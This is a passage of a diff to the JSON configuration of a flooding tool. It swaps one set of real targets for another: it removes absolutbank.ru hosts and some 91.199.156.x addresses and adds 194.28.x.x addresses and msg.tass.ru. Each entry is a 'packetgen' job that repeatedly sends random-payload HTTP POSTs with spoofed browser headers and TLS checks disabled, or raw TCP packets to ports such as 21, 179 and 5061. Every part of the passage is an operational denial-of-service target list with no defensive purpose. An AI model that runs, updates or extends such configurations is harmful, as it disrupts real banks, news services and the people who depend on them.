                             "insecure_skip_verify": true
                         }
@@ -1791,7 +1306,7 @@
                         "type": "http",
                         "data": {
                             "method": "POST",
-                            "path": "https://nap.absolutbank.ru",
+                            "path": "https://194.28.239.151",
                             "headers": {
                                 "Accept": "*/*",
                                 "Accept-Encoding": "gzip, deflate, br",
@@ -1804,9 +1319,9 @@
                                 "Sec-Fetch-User": "?1",
                                 "Pragma": "no-cache",
                                 "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://nap.absolutbank.ru",
-                                "Referer": "https://nap.absolutbank.ru",
-                                "X-Forwarded-Host": "nap.absolutbank.ru",
+                                "Origin": "https://194.28.239.151",
+                                "Referer": "https://194.28.239.151",
+                                "X-Forwarded-Host": "194.28.239.151",
                                 "User-Agent": "{{ random_user_agent }}"
                             },
                             "body": "{{ random_payload 1000 }}"
@@ -1817,40 +1332,21 @@
         },
         {
             "type": "packetgen",
-            "count": 17,
-            "name": "http://ip189.absolutbank.ru",
+            "count": 16,
+            "name": "tcp://194.28.239.125:21",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "ip189.absolutbank.ru:80"
+                        "address": "194.28.239.125:21"
                     }
                 },
                 "packet": {
                     "payload": {
-                        "type": "http",
+                        "type": "raw",
                         "data": {
-                            "method": "POST",
-                            "path": "http://ip189.absolutbank.ru",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "http://ip189.absolutbank.ru",
-                                "Referer": "http://ip189.absolutbank.ru",
-                                "X-Forwarded-Host": "ip189.absolutbank.ru",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
+                            "payload": "{{ random_payload 10 }}"
                         }
                     }
                 }
@@ -1858,14 +1354,58 @@
         },
         {
             "type": "packetgen",
-            "count": 17,
-            "name": "https://91.199.156.43",
+            "count": 16,
+            "name": "tcp://194.28.239.153:1935",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "91.199.156.43:443",
+                        "address": "194.28.239.153:1935"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 16,
+            "name": "tcp://194.28.239.175:4443",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "194.28.239.175:4443"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 16,
+            "name": "https://194.28.237.229",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "194.28.237.229:443",
                         "tls_config": {
                             "insecure_skip_verify": true
                         }
@@ -1876,7 +1416,7 @@
                         "type": "http",
                         "data": {
                             "method": "POST",
-                            "path": "https://91.199.156.43",
+                            "path": "https://194.28.237.229",
                             "headers": {
                                 "Accept": "*/*",
                                 "Accept-Encoding": "gzip, deflate, br",
@@ -1889,9 +1429,9 @@
                                 "Sec-Fetch-User": "?1",
                                 "Pragma": "no-cache",
                                 "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://91.199.156.43",
-                                "Referer": "https://91.199.156.43",
-                                "X-Forwarded-Host": "91.199.156.43",
+                                "Origin": "https://194.28.237.229",
+                                "Referer": "https://194.28.237.229",
+                                "X-Forwarded-Host": "194.28.237.229",
                                 "User-Agent": "{{ random_user_agent }}"
                             },
                             "body": "{{ random_payload 1000 }}"
@@ -1902,14 +1442,14 @@
         },
         {
             "type": "packetgen",
-            "count": 17,
-            "name": "https://sslgate-cb.absolutbank.ru",
+            "count": 16,
+            "name": "https://msg.tass.ru",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "sslgate-cb.absolutbank.ru:443",
+                        "address": "msg.tass.ru:443",
                         "tls_config": {
                             "insecure_skip_verify": true
                         }
@@ -1920,7 +1460,7 @@
                         "type": "http",
                         "data": {
                             "method": "POST",
-                            "path": "https://sslgate-cb.absolutbank.ru",
+                            "path": "https://msg.tass.ru",
                             "headers": {
                                 "Accept": "*/*",
                                 "Accept-Encoding": "gzip, deflate, br",
@@ -1933,9 +1473,9 @@
                                 "Sec-Fetch-User": "?1",
                                 "Pragma": "no-cache",
                                 "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://sslgate-cb.absolutbank.ru",
-                                "Referer": "https://sslgate-cb.absolutbank.ru",
-                                "X-Forwarded-Host": "sslgate-cb.absolutbank.ru",
+                                "Origin": "https://msg.tass.ru",
+                                "Referer": "https://msg.tass.ru",
+                                "X-Forwarded-Host": "msg.tass.ru",
                                 "User-Agent": "{{ random_user_agent }}"
                             },
                             "body": "{{ random_payload 1000 }}"
@@ -1946,40 +1486,21 @@
         },
         {
             "type": "packetgen",
-            "count": 17,
-            "name": "http://ip27.absolutbank.ru",
+            "count": 16,
+            "name": "tcp://194.28.237.2:179",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "ip27.absolutbank.ru:80"
+                        "address": "194.28.237.2:179"
                     }
                 },
                 "packet": {
                     "payload": {
-                        "type": "http",
+                        "type": "raw",
                         "data": {
-                            "method": "POST",
-                            "path": "http://ip27.absolutbank.ru",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "http://ip27.absolutbank.ru",
-                                "Referer": "http://ip27.absolutbank.ru",
-                                "X-Forwarded-Host": "ip27.absolutbank.ru",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
+                            "payload": "{{ random_payload 10 }}"
                         }
                     }
                 }
@@ -1987,43 +1508,21 @@
         },
         {
             "type": "packetgen",
-            "count": 17,
-            "name": "https://ip151.absolutbank.ru",
+            "count": 16,
+            "name": "tcp://194.28.236.88:5061",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "ip151.absolutbank.ru:443",
-                        "tls_config": {
-                            "insecure_skip_verify": true
-                        }
+                        "address": "194.28.236.88:5061"
                     }
                 },
                 "packet": {
                     "payload": {
-                        "type": "http",
+                        "type": "raw",
                         "data": {
-                            "method": "POST",
-                            "path": "https://ip151.absolutbank.ru",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://ip151.absolutbank.ru",
-                                "Referer": "https://ip151.absolutbank.ru",
-                                "X-Forwarded-Host": "ip151.absolutbank.ru",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
+                            "payload": "{{ random_payload 10 }}"
                         }
                     }
                 }
@@ -2031,81 +1530,21 @@
         },
         {
             "type": "packetgen",
-            "count": 17,
-            "name": "http://91.199.156.34",
+            "count": 16,
+            "name": "tcp://194.28.236.6:21",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "91.199.156.34:80"
+                        "address": "194.28.236.6:21"
                     }
                 },
                 "packet": {
                     "payload": {
-                        "type": "http",
+                        "type": "raw",
                         "data": {
-                            "method": "POST",
-                            "path": "http://91.199.156.34",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "http://91.199.156.34",
-                                "Referer": "http://91.199.156.34",
-                                "X-Forwarded-Host": "91.199.156.34",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 17,
-            "name": "http://invest.absolutbank.ru",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "invest.absolutbank.ru:80"
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "http://invest.absolutbank.ru",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "http://invest.absolutbank.ru",
-                                "Referer": "http://invest.absolutbank.ru",
-                                "X-Forwarded-Host": "invest.absolutbank.ru",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
+                            "payload": "{{ random_payload 10 }}"
                         }
                     }
                 }
